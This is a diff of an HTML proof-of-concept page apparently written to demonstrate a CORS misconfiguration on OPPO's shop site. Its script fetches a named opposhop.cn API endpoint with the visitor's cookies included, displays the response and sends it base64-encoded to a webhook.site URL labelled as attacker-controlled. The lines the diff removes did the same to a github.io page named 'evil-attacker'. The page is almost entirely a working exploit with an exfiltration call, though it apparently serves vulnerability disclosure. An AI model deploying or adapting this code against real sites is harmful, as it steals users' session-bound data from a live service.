@@ -1,21 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>OPPO CORS Exploit PoC</h2>
-    <button onclick="exploit()">Steal Data</button>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>OPPO CORS Exploit PoC</h2>
+  <button onclick="exploit()">Click to Exploit</button>
 
-    <script>
-      function exploit() {
-        fetch("https://www.opposhop.cn/cn/oapi/configs/web/icons/700002", {
-          credentials: "include"
-        })
-        .then(res => res.text())
-        .then(data => {
-          console.log("Exfiltrated Data:", data);
-          // Attacker could send this to their own server
-          fetch("https://mohammed-ishfaq.github.io/cors-poc/evil-attacker.html" + btoa(data));
-        });
-      }
-    </script>
-  </body>
+  <pre id="output"></pre>
+
+  <script>
+    function exploit() {
+      fetch("https://www.opposhop.cn/cn/oapi/configs/web/icons/700002", {
+        method: "GET",
+        credentials: "include" // sends cookies/session
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("output").textContent = data;
+
+        // Exfiltrate data to attacker-controlled server
+        fetch("https://webhook.site/4b77bece-c255-418a-a371-8f13fa2b6ccb?data=" + btoa(data));
+      })
+      .catch(error => {
+        document.getElementById("output").textContent = "Error: " + error;
+      });
+    }
+  </script>
+</body>
 </html>
